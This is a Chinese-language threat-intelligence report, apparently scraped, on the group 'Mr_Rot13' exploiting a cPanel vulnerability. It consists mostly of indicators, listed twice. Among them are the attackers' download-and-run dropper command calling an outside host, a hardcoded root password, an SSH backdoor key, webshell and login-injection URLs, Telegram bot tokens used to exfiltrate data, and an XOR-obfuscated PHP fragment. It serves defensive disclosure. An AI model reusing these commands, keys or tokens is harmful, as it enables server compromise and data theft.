# 秘密活动6年的神秘黑客组织Mr_Rot13正在利用cPanel高危漏洞部署后门木马

> 原文: https://www.ctfiot.com/307724.html
> ID: 307724

F=/root/.u$$;(wget -q -O"$F"'https://cp.dene.de[.]com/Update'2>/dev/null||curl -sk -o"$F"'https://cp.dene.de[.]com/Update')&&chmod755"$F"&& (nohup"$F"-s >/dev/null 2>&1 &)&&sleep2;rm-f"$F"

MD5: fb1bc3f935fdeb3555465070ba2db33cMagic: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedFileName: Update

修该密码 & 植入SSH 公钥，对应的处理函数分别为main_changeRootPassword和main_installSSHKey

root:
123Qwe123C

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIswJUfqrkbm2sIMfNHZn1sOYkxjNzEynqJKFU7qoez cpanel-updater

植入PHP Webshell, 对应的处理函数为main_installCpanelPy

https://cp.dene.de[.]com/cpanel.py

/usr/local/cpanel/cgi-sys/cpanel.py

注入Javascript代码，对应的处理函数为main_injectLoginPage

https://cp.dene.de[.]com/login.jshttps::/cp.dena.de[.]com/login.tmpl

/usr/local/cpanel/base/unprotected/cpanel

部署Filemanager远控，对应的处理函数为main_runWpsockInstaller

敏感的信息回传至C2，对应的处理函数为main_postData

敏感信息回传至回传到Telegram，对应的处理函数为main_sendTelegram或main_sendTelegramFile

1190043163:
AAEy1FDoB_r8KFiOIqsEpgDQ2k78Ai6BdWk

1190043163:
AAFtaUfpui9fqKoRnqOa5XvT6MHLcK1axiU

MD5:
9305b4ebbb4d39907cf36b62989a6af3MAGIC: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedName: filemanager-linux-amd64

MD5:
2286f126ab4740ccf2595ad1fa0c615cMagic:
PHP script textName:
helper.php

$___= ("8"^"K") .("8"^"L") . ("8"^"J") .("v"^")") . ("8"^"J") .("T"^";") . ("8"^"L") .("W"^"f") . ("R"^"a");


```
F=/root/.u$$;(wget -q -O"$F"'https://cp.dene.de[.]com/Update'2>/dev/null||curl -sk -o"$F"'https://cp.dene.de[.]com/Update')&&chmod755"$F"&& (nohup"$F"-s >/dev/null 2>&1 &)&&sleep2;rm-f"$F"
MD5: fb1bc3f935fdeb3555465070ba2db33cMagic: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedFileName: Update
root:
123Qwe123C
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIswJUfqrkbm2sIMfNHZn1sOYkxjNzEynqJKFU7qoez cpanel-updater
https://cp.dene.de[.]com/cpanel.py
/usr/local/cpanel/cgi-sys/cpanel.py
https://cp.dene.de[.]com/login.jshttps::/cp.dena.de[.]com/login.tmpl
/usr/local/cpanel/base/unprotected/cpanel
MD5:
9305b4ebbb4d39907cf36b62989a6af3MAGIC: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedName: filemanager-linux-amd64
MD5:
2286f126ab4740ccf2595ad1fa0c615cMagic:
PHP script textName:
helper.php
$___= ("8"^"K") .("8"^"L") . ("8"^"J") .("v"^")") . ("8"^"J") .("T"^";") . ("8"^"L") .("W"^"f") . ("R"^"a");
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507755-wxsync-2026-05-5619082b552d14c92947c04f91c8d7af.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507756-wxsync-2026-05-9fc5d91e92cbf334400d00f235054f7e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507758-wxsync-2026-05-883674dcb57ca249cdb03f56c09bbe1c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507759-wxsync-2026-05-190fae6aeb1e935445a8e30172e26460.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507761-wxsync-2026-05-cf43195165238cbd91fe4aaba1859c08.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507762-wxsync-2026-05-6addfb715ccf60a24f9dfe85b7d0e5d9.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507764-wxsync-2026-05-e2b7e6ba0d1c6959292941f2dbd484fe.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507766-wxsync-2026-05-d0357fd13d02b841f684004351222176.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507767-wxsync-2026-05-f07a700ca4c5c04b607b13db7dc6ef79.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507768-wxsync-2026-05-5040afdae2dd349b69d6dc5e4cd2facd.png)